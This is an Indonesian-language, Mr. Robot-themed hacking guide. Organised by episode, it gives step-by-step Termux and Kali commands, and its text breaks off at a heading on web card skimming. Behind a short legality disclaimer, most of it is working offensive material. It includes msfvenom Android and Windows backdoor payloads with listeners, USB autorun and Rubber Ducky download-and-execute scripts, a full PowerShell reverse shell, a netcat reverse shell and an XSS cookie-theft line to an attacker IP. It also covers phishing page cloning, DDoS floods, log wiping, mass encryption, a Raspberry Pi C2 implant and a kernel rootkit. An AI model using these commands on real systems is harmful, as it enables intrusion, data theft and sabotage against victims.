# 🔓 MR. ROBOT: LENGKAP SEMUA TEKNIK HACKING, TOOLS & TUTORIAL STEP-BY-STEP
## Termux & Kali Linux (Bukan Nethunter) — Semua Season 1–4

> **Dokumen ini disusun untuk tujuan edukasi, CTF, lab pribadi, dan penetration testing legal.**
> Semua teknik di bawah adalah teknik NYATA yang ditampilkan di serial Mr. Robot — serial yang terkenal karena akurasinya (dikonsultasikan oleh hacker sungguhan: Jeff Moss/DEF CON, Marc Rogers/Cloudflare, Ryan Kazanciyan/Tanium, Andre McGregor/FBI Cyber).

---

# 📋 DAFTAR ISI

1. [Pengenalan & Filosofi Hacking ala Mr. Robot](#1-pengenalan)
2. [Setup Environment: Termux & Kali Linux](#2-setup)
3. [SEASON 1 — Semua Teknik](#3-season-1)
4. [SEASON 2 — Semua Teknik](#4-season-2)
5. [SEASON 3 — Semua Teknik](#5-season-3)
6. [SEASON 4 — Semua Teknik](#6-season-4)
7. [Master List Tools](#7-tools)
8. [Referensi Cepat Perintah](#8-cheatsheet)

---

# 1. PENGENALAN

Mr. Robot menampilkan hacking yang **realistis**. Tidak ada "GUI interface in Visual Basic". Yang ada:
- **Kali Linux** sebagai OS utama
- **Terminal** sebagai antarmuka utama
- **Tools open-source nyata**: Nmap, Metasploit, SET, Aircrack-ng, John the Ripper, Wireshark, dll.
- **Social Engineering** sebagai vektor utama (bukan eksploit teknis semata)

Prinsip Elliot Alderson:
> "People are the weakest link in security. You can have the best firewall in the world, but one person clicking the wrong link and it's all over."

---

# 2. SETUP ENVIRONMENT

## 2.1 Setup di Termux (Android)

```bash
# Update & upgrade
pkg update && pkg upgrade -y

# Install tools dasar
pkg install -y git python python3 python2 nmap curl wget openssh openssl \
    netcat-openbsd socat tor proxychains-ng nano vim

# Install Kali Linux di Termux (via Nethunter-style repo TANPA root)
# Metode: install Kali repository
pkg install -y wget
wget -O install-nethunter-termux https://offs.ec/2MceZWr
chmod +x install-nethunter-termux
./install-nethunter-termux

# Atau metode minimal: install tools Kali satu per satu
pkg install -y nmap hydra john aircrack-ng metasploit-framework \
    sqlmap wireshark-gtk ettercap bettercap
```

> **Catatan**: Di Termux tanpa root, beberapa tools (aircrack-ng, bettercap) butuh WiFi chipset yang support monitor mode + root. Alternatif: gunakan **Kali Linux** di VM/laptop untuk tools tersebut.

## 2.2 Setup di Kali Linux

```bash
# Update
sudo apt update && sudo apt full-upgrade -y

# Tools sudah pre-installed, tapi pastikan:
sudo apt install -y kali-linux-default kali-tools-web kali-tools-wireless \
    kali-tools-passwords kali-tools-exploitation kali-tools-sniffing \
    kali-tools-social-engineering

# Update Metasploit
sudo msfupdate

# Install tools tambahan dari Mr. Robot
sudo apt install -y setoolkit proxmark3 mfterm libnfc-bin \
    exploitdb beef-xss responder bloodhound
```

## 2.3 Setup Lab (WAJIB untuk latihan legal)

```bash
# Install VM target yang vulnerable
# - Metasploitable 2 (VM khusus untuk latihan)
# - DVWA (Damn Vulnerable Web App)
# - OWASP Juice Shop
# - VulnHub machines

# Download Metasploitable 2:
# https://sourceforge.net/projects/metasploitable/files/Metasploitable2/

# Install DVWA di localhost:
git clone https://github.com/digininja/DVWA.git
# Setup di /var/www/html/dvwa, konfigurasi database MySQL
```

---

# 3. SEASON 1

## 📌 S1E1 — "eps1.0_hellofriend.mov"

### Teknik 1: Investigasi Target (OSINT & Reconnaissance)

Elliot melakukan recon terhadap target-nya (Ron dari Ron's Coffee).

**Tools**: `whois`, `dig`, `nslookup`, `theHarvester`, `Maltego`

```bash
# WHOIS lookup
whois ronscoffee.com

# DNS enumeration
dig ronscoffee.com ANY
dig ronscoffee.com MX
nslookup ronscoffee.com

# Email harvesting
theHarvester -d ronscoffee.com -b google,linkedin,bing -l 500

# Subdomain enumeration
sublist3r -d ronscoffee.com
# atau
amass enum -d ronscoffee.com
```

### Teknik 2: ARP Spoofing / MITM (Man-in-the-Middle)

Elliot melakukan MITM di jaringan kafe untuk menangkap traffic korban.

**Tools**: `ettercap`, `bettercap`, `arpspoof`

```bash
# === Cara 1: ettercap ===
# Aktifkan IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoof dengan ettercap (GUI atau CLI)
ettercap -T -q -i wlan0 -M ARP:REMOTE /192.168.1.1/ /192.168.1.100/

# === Cara 2: bettercap (lebih modern, seperti di Mr. Robot) ===
bettercap -iface wlan0

# Di dalam bettercap:
net.probe on
net.sniff on
set arp.spoof.targets 192.168.1.100
arp.spoof on
# Lalu sniff:
set net.sniff.output capture.pcap
```

**Di Termux** (butuh root untuk raw socket):
```bash
# Install bettercap
pkg install bettercap
# Butuh root untuk ARP spoofing
su -c "bettercap -iface wlan0"
```

### Teknik 3: Password Cracking dengan John the Ripper

Elliot menggunakan `john` untuk crack password hash.

**Tools**: `john` (John the Ripper)

```bash
# Identifikasi hash
hash-identifier
# atau
hashid <hash>

# Crack hash MD5
john --format=raw-md5 hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Crack hash Linux (/etc/shadow)
unshadow /etc/passwd /etc/shadow > shadow.txt
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt

# Show cracked passwords
john --show shadow.txt
```

### Teknik 4: elpscrk (Custom Elliot's Password Cracker)

Elliot menggunakan tool custom bernama `elpscrk` — tool untuk generate wordlist personal berdasarkan info korban (nama, tanggal lahir, hewan peliharaan, dll).

```bash
# Install cupp (Common User Passwords Profiler) — ekuivalen real-world
git clone https://github.com/Mebus/cupp.git
cd cupp
python3 cupp.py -i
# Jawab pertanyaan: nama, nickname, birthday, partner, child, pet, company, dll
# Output: wordlist personal

# Alternatif: crunch (generate wordlist brute force)
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt

# crunch dengan pattern (misal: nama + 4 digit tahun)
crunch 10 10 -t shayla%%%% -o shayla_wordlist.txt
```

### Teknik 5: Tor untuk Anonymitas

Elliot menggunakan Tor untuk menyembunyikan identitasnya.

```bash
# Install & jalankan Tor
pkg install tor
tor

# Proxychains: jalankan tool apapun lewat Tor
proxychains nmap -sT -Pn target.com
proxychains firefox
proxychains sqlmap -u "http://target.com/page.php?id=1"

# Tor Browser di Kali
sudo apt install torbrowser-launcher
torbrowser-launcher
```

---

## 📌 S1E2 — "eps1.1_ones-and-zer0es.mpeg"

### Teknik 6: DDoS Attack (Distributed Denial of Service)

fsociety melakukan DDoS terhadap server E Corp.

**Tools**: `hping3`, `LOIC` (Low Orbit Ion Cannon), `slowloris`

```bash
# === hping3: SYN flood ===
hping3 -S --flood -V -p 80 192.168.1.100

# === hping3: UDP flood ===
hping3 --udp --flood -p 53 192.168.1.100

# === Slowloris (HTTP slow attack — seperti di Mr. Robot) ===
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
python3 slowloris.py 192.168.1.100 -p 80 -s 200

# === T50 (stress testing tool) ===
t50 --flood --protocol TCP 192.168.1.100
```

> **Catatan**: DDoS nyata butuh botnet/distribusi. Di Mr. Robot, fsociety menggunakan jaringan zombie/compromised machines.

### Teknik 7: Malware Analysis & Rootkit Detection

Elliot menganalisis malware DDoS di server E Corp.

```bash
# Static analysis
file malware.bin
strings malware.bin | head -50
md5sum malware.bin
sha256sum malware.bin

# Upload ke VirusTotal (CLI)
curl -X POST -F "file=@malware.bin" https://www.virustotal.com/api/v3/files

# Dynamic analysis di sandbox
# Tools: Cuckoo Sandbox, Any.Run, Hybrid Analysis
```

---

## 📌 S1E3 — "eps1.2_d3bug.mkv"

### Teknik 8: Social Engineering — Pretexting (Menyamar)

Elliot menyamar sebagai musisi untuk mendekati target. Ini disebut **pretexting** — membangun identitas palsu.

**Framework**: OSINT → Build Persona → Approach → Exploit

```bash
# Buat identitas palsu dengan tools OSINT
# Cari info target:
theHarvester -d target.com -b all
sherlock target_username  # cari username di semua platform
```

### Teknik 9: Phishing dengan Social Engineer Toolkit (SET)

**Tools**: `setoolkit`

```bash
# Jalankan SET
sudo setoolkit

# Pilih menu:
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 2) Site Cloner
# Masukkan URL target: http://gmail.com
# SET akan clone halaman login dan host di IP attacker

# Kirim link ke korban via email/SMS spoofing
# SET juga punya SMS spoofing module:
# 1) Social-Engineering Attacks
# 7) SMS Spoofing Attack Vector
```

---

## 📌 S1E4 — "eps1.3_da3m0ns.mp4"

### Teknik 10: Exploit FTP dengan Metasploit

Elliot mengeksploitasi FTP server yang outdated.

**Tools**: `Metasploit Framework`

```bash
# Jalankan Metasploit
msfconsole

# Cari exploit FTP
search ftp
search type:exploit platform:linux ftp

# Gunakan exploit (contoh: vsftpd backdoor — ada di Metasploitable 2)
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.100
set RPORT 21
exploit

# Setelah masuk (meterpreter shell):
# - Upload/download file
# - Pivot ke jaringan internal
# - Keylogging
# - Screenshot
```

### Teknik 11: Exploit Samba (EternalBlue-style)

```bash
msfconsole
search samba
use exploit/linux/samba/is_known_pipename
set RHOSTS 192.168.1.100
exploit
```

---

## 📌 S1E5 — "eps1.4_3xpl0its.wmv"

### Teknik 12: SMS Spoofing Attack

Elliot/Darlene menggunakan SET untuk SMS spoofing.

```bash
sudo setoolkit
# 1) Social-Engineering Attacks
# 7) SMS Spoofing Attack Vector
# Pilih gateway SMS (butuh API key dari provider SMS seperti Twilio)
```

> **Alternatif real-world**: Gunakan API Twilio/Plivo dengan nomor spoofed (hanya untuk testing dengan consent).

### Teknik 13: Exploiting Android dengan Metasploit

Elliot membuat payload Android untuk mengambil alih ponsel target.

```bash
# Buat payload APK
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 LPORT=4444 \
    -o update.apk

# Sign APK (agar bisa diinstall)
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name \
    -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 \
    -keystore my-release-key.keystore update.apk alias_name
zipalign -v 4 update.apk signed_update.apk

# Setup listener
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit

# Setelah korban install APK, dapatkan meterpreter session:
# Commands di meterpreter Android:
help
# dump_sms          — baca SMS
# dump_contacts     — baca kontak
# webcam_snap       — ambil foto dari kamera
# record_mic        — rekam suara
# geolocate         — lacak lokasi GPS
# send_sms          — kirim SMS dari ponsel korban
```

---

## 📌 S1E6 — "eps1.5_br4ve-trave1er.asf"

### Teknik 14: USB Drop Attack (Malicious Flash Drive)

Elliot/Darlene menjatuhkan USB berisi malware di area parkir penjara.

**Tools**: `metasploit` (autorun payload), `USB Rubber Ducky` (hardware), atau `BadUSB`

```bash
# === Cara software: Buat autorun USB ===
# Format USB, buat file autorun.inf + payload

# Buat payload executable dengan msfvenom
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 LPORT=4444 \
    -f exe -o payload.exe

# Buat autorun.inf
cat > autorun.inf << 'EOF'
[AutoRun]
open=payload.exe
action=Open folder to view files
shell\open\command=payload.exe
EOF

# Copy ke USB root

# === Cara hardware: USB Rubber Ducky ===
# Script Ducky (inject keystrokes seperti keyboard)
# Contoh script: buka cmd, download & jalankan payload
DELAY 3000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING powershell -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.50/payload.ps1')"
ENTER

# Compile dengan DuckEncoder
java -jar duckencoder.jar -i script.txt -o inject.bin
```

### Teknik 15: Hacking Sistem Penjara (SCADA/Industrial)

Elliot meng-hack sistem penjara untuk membuka sel.

**Konsep**: SCADA/ICS hacking — eksploitasi sistem kontrol industri.

```bash
# Scan port SCADA umum
nmap -p 502,20000,44818,1911,1962,47808,502,102 192.168.1.0/24

# Tools SCADA hacking
# - modscan (Modbus scanner)
# - s7scan (Siemens S7)
# - Wireshark untuk analisis protokol industri
```

---

## 📌 S1E7 — "eps1.6_v1ew-s0urce.flv"

### Teknik 16: Bluetooth Hacking (Bluesniff, Bluebugging)

Elliot menyerang via Bluetooth — MITM keyboard Bluetooth.

**Tools**: `bluesniff`, `bluez`, `btscanner`, `ubertooth` (hardware)

```bash
# Scan perangkat Bluetooth
hcitool scan
hcitool inq

# Detail info perangkat
sdptool browse <MAC_ADDRESS>

# Bluebugging (baca SMS, kontak, panggilan)
btscanner
# atau
bluesnarfer -r 1-100 -C 7 -b <MAC_ADDRESS>  # baca phonebook

# Bluesmack (DoS Bluetooth)
l2ping -i hci0 -s 600 -f <MAC_ADDRESS>

# MITM Bluetooth (butuh hardware Ubertooth)
# Tools: ubertooth-btle, crackle (crack BLE encryption)
```

### Teknik 17: Keylogging (Hardware & Software)

```bash
# Software keylogger di Linux (post-exploitation)
# Meterpreter keylogger:
keyscan_start
keyscan_dump
keyscan_stop

# Hardware: USB keylogger (physical device)
```

---

## 📌 S1E8 — "eps1.7_wh1ter0se.m4v"

### Teknik 18: RFID Key Card Cloning (Steel Mountain)

fsociety meng-clone kartu akses RFID untuk masuk ke Steel Mountain.

**Tools**: `Proxmark3` (hardware), `mfterm`, `libnfc`, `nfc-mfclassic`

```bash
# === Dengan Proxmark3 (hardware ~$100) ===
# Baca kartu MIFARE Classic
proxmark3> hf mf rdsc
proxmark3> hf mf mifare  # crack key default

# Dump isi kartu
proxmark3> hf mf dump

# Clone ke kartu kosong
proxmark3> hf mf restore

# === Dengan libnfc (reader/writer USB) ===
# Install
sudo apt install libnfc-bin mfterm

# Baca kartu
nfc-list
nfc-mfclassic r a u card.dump

# Crack key dengan mfoc
sudo apt install mfoc
mfoc -O card.dump

# Write ke kartu kosong
nfc-mfclassic w a u card.dump
```

> **Catatan**: Kartu RFID low-frequency (125kHz) lebih mudah di-clone — tinggal baca dan tulis. Kartu high-frequency (13.56MHz MIFARE) butuh crack key dulu.

---

## 📌 S1E9 — "eps1.8_m1rr0r1ng.qt"

### Teknik 19: Raspberry Pi Implant (Physical Backdoor)

fsociety memasang Raspberry Pi di Steel Mountain untuk akses remote.

**Setup Raspberry Pi implant:**

```bash
# Di Raspberry Pi, setup reverse SSH tunnel
# Auto-connect ke server C2 (Command & Control)

# /etc/rc.local atau systemd service
#!/bin/bash
while true; do
    ssh -N -R 2222:localhost:22 user@C2_SERVER_IP -p 443 -o StrictHostKeyChecking=no
    sleep 60
done

# Atau dengan autossh
autossh -M 0 -N -R 2222:localhost:22 user@C2_SERVER_IP -p 443

# Di server C2, akses Pi:
ssh -p 2222 pi@localhost

# Setup 3G/4G USB modem untuk koneksi independen
# Tools: wvdial, sakis3g
```

### Teknik 20: Pivoting / Tunneling

```bash
# SSH tunneling
ssh -L 8080:internal.target:80 user@pivot.host
ssh -R 9090:localhost:9090 user@pivot.host
ssh -D 9050 user@pivot.host  # SOCKS proxy

# Proxychains dengan SOCKS
proxychains nmap -sT internal.target

# Chisel (HTTP tunneling)
./chisel server -p 8080 --reverse
./chisel client C2_IP:8080 R:socks
```

---

## 📌 S1E10 — "eps1.9_zer0-day.avi"

### Teknik 21: The Five/Nine Hack — Destruksi Data (Encryption + Wipe)

fsociety meng-encrypt dan menghancurkan data E Corp di seluruh dunia.

**Konsep**: Ransomware-style mass encryption + secure deletion.

```bash
# === Simulasi di lab ===
# Encrypt file dengan GPG
gpg --symmetric --cipher-algo AES256 important_file.dat

# Encrypt massal (ransomware simulation)
find /target/directory -type f -exec gpg --symmetric --cipher-algo AES256 {} \;

# Secure delete (overwrite data)
shred -vfz -n 10 sensitive_file.dat
# atau
dd if=/dev/urandom of=/dev/sdX bs=1M  # wipe disk

# Wipe free space
sfill /target/directory
```

### Teknik 22: Covering Tracks (Anti-Forensics)

```bash
# Hapus log
rm -f /var/log/auth.log
# Overwrite log
shred -u /var/log/*.log

# Clear bash history
history -c
rm ~/.bash_history

# Timestomp (ubah timestamp file — anti forensik)
touch -d "2020-01-01 00:00:00" file.txt

# Secure delete dengan srm (secure-delete package)
srm -vz file.txt
```

---

# 4. SEASON 2

## 📌 S2E1 — "eps2.0_unm4sk-pt1.tc"

### Teknik 23: USB Ransomware Delivery (Bank of E)

Darlene membuat USB ransomware dengan SET.

```bash
sudo setoolkit
# 1) Social-Engineering Attacks
# 3) Infectious Media Generator
# Pilih payload (contoh: reverse shell / ransomware simulation)

# Atau buat custom dengan msfvenom
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 LPORT=4444 \
    -e x86/shikata_ga_nai -i 3 \
    -f exe -o ransomware_sim.exe
```

---

## 📌 S2E2 — "eps2.1_k3rnel-pan1c.ksd"

### Teknik 24: Hacking Smart Home / IoT

fsociety meng-hack rumah Susan Jacobs (smart home).

**Tools**: `nmap`, `bettercap`, `homeassistant API`, `MQTT`

```bash
# Scan IoT devices
nmap -p 80,443,1883,8883,5353,8080,8443 192.168.1.0/24

# MQTT (protocol IoT umum) — sniff & inject
mosquitto_sub -h 192.168.1.100 -t "#" -v  # subscribe semua topic
mosquitto_pub -h 192.168.1.100 -t "home/lights" -m "OFF"

# Exploit IoT default password
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    192.168.1.100 http-get /login
```

---

## 📌 S2E4 — "eps2.3_logic_b0mb.hc"

### Teknik 25: FBI Phone Hacking (Android Zero-Day via Metasploit)

Elliot membuat malware Android zero-day untuk ponsel FBI.

**Konsep**: Exploit remote code execution di Samsung Knox (CVE nyata 2014).

```bash
# Buat Android exploit dengan Metasploit
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 LPORT=4444 \
    -o fbi_update.apk

# Atau exploit langsung via browser (drive-by download)
use exploit/android/browser/stagefright_mp4_tx3g_64bit
set URIPATH /update
set LHOST 192.168.1.50
exploit

# Korban buka link → exploit otomatis jalan
```

---

## 📌 S2E5 — "eps2.4_m4ster_s1ave.aes"

### Teknik 26: Femtocell Hack (IMSI Catcher / Stingray)

Elliot memasang femtocell (fake cell tower) di kantor FBI untuk intercept traffic mobile.

**Konsep**: Femtocell di-modify jadi IMSI catcher — intercept SMS, panggilan, data mobile.

**Tools**: `OpenBTS`, `GNU Radio`, `BladeRF/USR` (hardware SDR), `Kali Linux + RTL-SDR`

```bash
# === Setup OpenBTS (GSM base station) ===
sudo apt install openbts

# Konfigurasi OpenBTS
sudo OpenBTSCLI
# config GSM.Radio.Band 900
# config GSM.Radio.C0 51

# Sniff GSM dengan RTL-SDR + Wireshark
rtl_sdr -f 935000000 -s 2000000 -g 50 capture.raw
# atau langsung ke Wireshark
```

> **Catatan**: Ini butuh hardware SDR (Software Defined Radio) seperti BladeRF, USRP, atau HackRF. Harga $300–$2000. **Sangat ilegal** digunakan di jaringan publik tanpa izin (interferensi spektrum frekuensi).

### Teknik 27: Reverse Shell Two-Stage Exploit

Elliot menjelaskan: "step three, a reverse shell two-stage exploit."

```bash
# Stage 1: Dropper ( downloader )
msfvenom -p windows/download_exec \
    URL=http://192.168.1.50/stage2.exe \
    -f exe -o stage1.exe

# Stage 2: Full payload
msfvenom -p windows/meterpreter/reverse_https \
    LHOST=192.168.1.50 LPORT=443 \
    -f exe -o stage2.exe

# Listener
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST 192.168.1.50
set LPORT 443
exploit -j
```

---

## 📌 S2E6 — "eps2.5_h4ndshake.sme"

### Teknik 28: Hacking E-Coin / Cryptocurrency

Elliot mengeksploitasi sistem E-Coin (cryptocurrency fiktif di Mr. Robot).

**Konsep nyata**: Blockchain/smart contract exploitation.

```bash
# Analisis smart contract (Ethereum)
# Tools: Mythril, Slither, Echidna
pip3 install mythril
myth analyze contract.sol

# Scan cryptocurrency wallet vulnerabilities
# Tools: BlockSci, Bitcoin Core RPC
```

---

## 📌 S2E7 — "eps2.6_succ3ss0r.p12"

### Teknik 29: Car Hacking (CAN Bus)

Elliot meng-hack mobil (CAN bus hacking).

**Tools**: `can-utils` (candump, cansend), `SocketCAN`, `ICSim` (simulator)

```bash
# Install can-utils
sudo apt install can-utils

# Setup virtual CAN interface (untuk latihan)
sudo modprobe vcan
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0

# Dump CAN messages (seperti di Mr. Robot)
candump vcan0

# Send CAN message (contoh: unlock doors)
cansend vcan0 19B#000000000000

# ICSim (Instrument Cluster Simulator) untuk latihan
git clone https://github.com/zombieCraig/ICSim.git
cd ICSim
./setup_vcan.sh
./icsim vcan0
./controls vcan0
```

### Teknik 30: HID Injection (BadUSB)

```bash
# USB Rubber Ducky / Digispark ATTiny85
# Script: buka terminal, inject payload

# Digispark (Arduino IDE)
#include <DigiKeyboard.h>
void setup() {
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell -w hidden -enc <BASE64_PAYLOAD>");
}
void loop() {}
```

---

## 📌 S2E9 — "eps2.7_init5.fve"

### Teknik 31: Hacking dengan DNS Spoofing

```bash
# Edit hosts file lokal (MITM lokal)
echo "192.168.1.50 facebook.com" >> /etc/hosts

# DNS spoofing dengan ettercap
ettercap -T -q -i wlan0 -P dns_spoof -M ARP:REMOTE /192.168.1.1/ /192.168.1.100/

# Konfigurasi etter.dns
# facebook.com A 192.168.1.50
# *.facebook.com A 192.168.1.50

# dnsspoof (lebih simple)
echo "192.168.1.50 *.facebook.com" > spoofhosts
dnsspoof -i wlan0 -f spoofhosts
```

---

## 📌 S2E12 — "eps2.9_pyth0n-pt2.p7z"

### Teknik 32: Stage 2 — Hacking UPS Firmware (Industrial Control)

Elliot meng-hack firmware UPS (Uninterruptible Power Supply) untuk menciptakan ledakan/kebakaran.

**Konsep**: Firmware modification + supply chain attack.

```bash
# Analisis firmware
binwalk firmware.bin
binwalk -e firmware.bin  # extract

# Modifikasi firmware
# Tools: Firmware Mod Kit (FMK)
git clone https://github.com/rampageX/firmware-mod-kit.git
cd firmware-mod-kit
./extract-firmware.sh firmware.bin

# Edit file, lalu rebuild
./build-firmware.sh

# Flash firmware (di lab!)
# UPS management via SNMP
snmpwalk -v2c -c public 192.168.1.100
```

---

# 5. SEASON 3

## 📌 S3E1 — "eps3.0_power-saver-mode.h"

### Teknik 33: Hacking via Malicious Document (Macro Virus)

Elliot mengirim dokumen berbahaya ke target.

```bash
# Buat macro malware (simulasi lab)
# Tools: Empire, Unicorn, Veil

# Unicorn (PowerShell downgrade attack)
git clone https://github.com/trustedsec/unicorn.git
cd unicorn
python3 unicorn.py windows/meterpreter/reverse_tcp 192.168.1.50 4444

# Output: powershell_attack.txt — copy ke macro VBA
```

---

## 📌 S3E2 — "eps3.1_undo.gz"

### Teknik 34: Phishing OWA (Outlook Web Access) dengan SET

Elliot menggunakan SET untuk clone halaman login OWA E Corp.

```bash
sudo setoolkit

# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 2) Site Cloner
# IP: 192.168.1.50
# URL: https://mail.ecorp.com/owa

# SET akan:
# - Clone halaman OWA
# - Host di port 80
# - Log semua username+password yang diinput
# Tersimpan di: /root/.set/reports/
```

### Teknik 35: Supply Chain Attack (Backdoor di Software Update)

Elliot memasukkan backdoor ke dalam update software yang legitimate.

**Konsep**: Compromise build server / signing key.

```bash
# Backdoor binary (simulasi)
# Tools: Backdoor Factory (BDF)
git clone https://github.com/secretsquirrel/the-backdoor-factory.git
cd the-backdoor-factory
./backdoor.py -f legitimate_software.exe -H 192.168.1.50 -P 4444 -s reverse_shell_tcp

# Atau MITM update (DNS spoof + fake update server)
```

---

## 📌 S3E3 — "eps3.2_legacy.so"

### Teknik 36: Hacking Building Automation / HVAC

Elliot meng-hack sistem HVAC gedung E Corp.

**Konsep**: BACnet/Modbus protocol exploitation.

```bash
# Scan BACnet devices
nmap -p 47808 --script bacnet-info 192.168.1.0/24

# Tools: BACnet-stack
git clone https://github.com/bacnet-stack/bacnet-stack.git
# Bacnet client untuk read/write property
```

---

## 📌 S3E4 — "eps3.3_metadata.par2"

### Teknik 37: Metadata Analysis & Steganography

Elliot menganalisis metadata file untuk tracking.

```bash
# Metadata analysis
exiftool photo.jpg
exiftool document.pdf

# Steganography (sembunyikan data di gambar)
steghide embed -cf image.jpg -ef secret.txt -p password
steghide extract -sf image.jpg -p password

# Stegosuite (GUI alternatif)
# binwalk untuk detect hidden files
binwalk image.jpg
```

---

## 📌 S3E5 — "eps3.4_runtime-error.r00"

### Teknik 38: Privilege Escalation di Linux

Elliot melakukan privilege escalation untuk mendapatkan root.

```bash
# === Enum ===
# LinPEAS (Linux Privilege Escalation Awesome Script)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Manual enum
find / -perm -4000 -type f 2>/dev/null  # SUID binaries
sudo -l  # sudo permissions
cat /etc/crontab  # cron jobs
ps aux | grep root  # running processes

# === Exploit ===
# Kernel exploit (contoh: DirtyCow CVE-2016-5195)
# Download, compile, run
gcc -pthread dirtycow.c -o dirtycow -lcrypt
./dirtycow

# SUID binary abuse
find / -perm -4000 2>/dev/null
# Exploit via GTFOBins: https://gtfobins.github.io/
```

### Teknik 39: Pass-the-Hash (Windows Network)

```bash
# Dump hash dengan Mimikatz (post-exploitation Windows)
# Atau dari Linux dengan CrackMapExec
crackmapexec smb 192.168.1.0/24 -u admin -H <NTLM_HASH>

# Impacket (Pass-the-Hash)
python3 psexec.py -hashes :<NTLM_HASH> admin@192.168.1.100
python3 wmiexec.py -hashes :<NTLM_HASH> admin@192.168.1.100
```

---

## 📌 S3E6 — "eps3.5_kill-process.inc"

### Teknik 40: Process Injection & Rootkit

```bash
# Process injection (Linux)
# Tools: gdb, ptrace
gdb -p <PID>
# call (void*)system("nc -e /bin/bash 192.168.1.50 4444")

# Rootkit (educational)
# Tools: diamorphine (LKM rootkit)
git clone https://github.com/m0nad/Diamorphine.git
cd Diamorphine
make
insmod diamorphine.ko
# Signal 31 untuk hide process, 63 untuk root shell
```

---

## 📌 S3E7 — "eps3.6_fredrick+tanya.chk"

### Teknik 41: Hacking dengan Rubber Ducky (Lagi)

Darlene menggunakan USB Rubber Ducky untuk akses cepat.

```bash
# Payload: Reverse shell dalam 3 detik
DELAY 1000
GUI r
DELAY 300
STRING powershell -w hidden -c "$c=New-Object Net.Sockets.TCPClient('192.168.1.50',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$s.Write(([Text.Encoding]::ASCII).GetBytes($r2),0,$r2.Length);$s.Flush()};$c.Close()"
ENTER
```

---

## 📌 S3E9 — "eps3.8_stage3.torrent"

### Teknik 42: BitTorrent Tracking & Monitoring

fsociety menggunakan torrent untuk distribusi data.

```bash
# Monitor torrent traffic
# Tools: Wireshark + BT protocol dissector

# Buat torrent sendiri (distribusi file)
mktorrent -a http://tracker.com:6969/announce -o file.torrent file.dat

# Seed torrent
transmission-cli -w /path/to/file file.torrent
```

---

## 📌 S3E10 — "eps3.9_shutdown-r"

### Teknik 43: Mass Surveillance — Hacking Smart TV / Microphone

Elliot mengaktifkan microphone smart TV untuk surveillance.

**Konsep**: IoT device exploitation.

```bash
# Scan smart TV
nmap -p 8000,8001,8080,9090 192.168.1.0/24

# Samsung TV API (contoh)
curl -X POST http://192.168.1.100:8000/api/v2/channels/pc

# Sniff traffic TV
tcpdump -i wlan0 host 192.168.1.100 -w tv_traffic.pcap
```

---

# 6. SEASON 4

## 📌 S4E1 — "eps4.0_hello-elliot.p7z"

### Teknik 44: Hacking Law Firm (Email Server)

Elliot & Mr. Robot meng-hack firma hukum untuk akses email klien.

**Konsep**: Exchange server hacking + PST extraction.

```bash
# Email recon
theHarvester -d lawfirm.com -b google -l 500

# Exchange OWA brute force (lab!)
hydra -l user@lawfirm.com -P /usr/share/wordlists/rockyou.txt \
    https://mail.lawfirm.com/owa/auth.owa \
    http-post-form "/owa/auth.owa:destination=https%%3A%%2F%%2Fmail.lawfirm.com%%2Fowa%%2F&flags=4&forcedownlevel=0&username=^USER^&password=^PASS^&isUtf8=1:F=err"

# Extract PST (setelah akses)
# Tools: libpff (pffexport)
pffexport -f all outlook.pst
```

---

## 📌 S4E2 — "eps4.1_method-not-allowed.h"

### Teknik 45: Web Application Hacking (SQL Injection)

Elliot mengeksploitasi web app dengan SQL Injection.

**Tools**: `sqlmap`, `Burp Suite`, `OWASP ZAP`

```bash
# === Manual SQLi ===
# Test di browser:
# http://target.com/page.php?id=1' OR '1'='1
# http://target.com/page.php?id=1 UNION SELECT 1,2,3--

# === Dengan sqlmap ===
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --columns
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump

# POST request
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=admin" --dbs

# Bypass WAF
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment --level=5 --risk=3
```

### Teknik 46: XSS (Cross-Site Scripting)

```bash
# Test XSS
<script>alert(document.cookie)</script>
<script>new Image().src="http://192.168.1.50/steal?cookie="+document.cookie</script>

# XSS BeEF (Browser Exploitation Framework)
sudo beef-xss
# Hook: <script src="http://192.168.1.50:3000/hook.js"></script>
# Kontrol browser korban via BeEF panel
```

---

## 📌 S4E3 — "eps4.2_payment-required.h"

### Teknik 47: Credit Card Skimming (Web Skimmer)

